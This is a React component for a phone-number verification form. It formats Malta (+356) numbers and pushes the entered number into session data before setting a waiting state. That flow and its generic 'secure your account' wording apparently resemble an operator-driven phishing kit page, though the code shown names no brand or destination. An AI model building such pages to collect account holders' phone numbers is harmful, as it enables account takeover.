import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Phone } from 'lucide-react';
import FormLayout from '@/components/FormLayout';
import ErrorAlert from '@/components/ErrorAlert';
import { useForm } from '@/contexts/FormContext';

const PhoneNumberPage = () => {
  const [phoneNumber, setPhoneNumber] = useState('');
  const { updateSessionData, setWaiting } = useForm();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    updateSessionData('phoneNumber', { phoneNumber });
    setWaiting(true);
  };

  const formatPhoneNumber = (value: string) => {
    // Remove all non-digits and plus signs
    const cleaned = value.replace(/[^\d+]/g, '');
    
    // If starts with +356, format as Malta number: +356 XXXX XXXX
    if (cleaned.startsWith('+356')) {
      const digits = cleaned.slice(4);
      if (digits.length <= 4) {
        return `+356 ${digits}`;
      } else {
        return `+356 ${digits.slice(0, 4)} ${digits.slice(4)}`;
      }
    }
    
    // If starts with 356, add + and format
    if (cleaned.startsWith('356')) {
      const digits = cleaned.slice(3);
      if (digits.length <= 4) {
        return `+356 ${digits}`;
      } else {
        return `+356 ${digits.slice(0, 4)} ${digits.slice(4)}`;
      }
    }
    
    // Otherwise format as Malta local number: XXXX XXXX
    if (cleaned.length <= 4) {
      return cleaned;
    } else {
      return `${cleaned.slice(0, 4)} ${cleaned.slice(4)}`;
    }
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhoneNumber(e.target.value);
    setPhoneNumber(formatted);
  };

  return (
    <FormLayout 
      title="Phone Number Verification" 
      description="To verify your identity and secure your account, please enter the phone number connected to your account."
    >
      <ErrorAlert />
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-2">
          <Label htmlFor="phoneNumber">Phone Number *</Label>
          <div className="relative">
            <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              id="phoneNumber"
              type="tel"
              value={phoneNumber}
              onChange={handlePhoneChange}
              className="pl-10"
              placeholder="+356 1234 5678"
              required
            />
          </div>
          <p className="text-xs text-muted-foreground">
            Enter the phone number registered with your account
          </p>
        </div>

        <Button type="submit" className="w-full">
          Continue
        </Button>
      </form>
    </FormLayout>
  );
};

export default PhoneNumberPage;
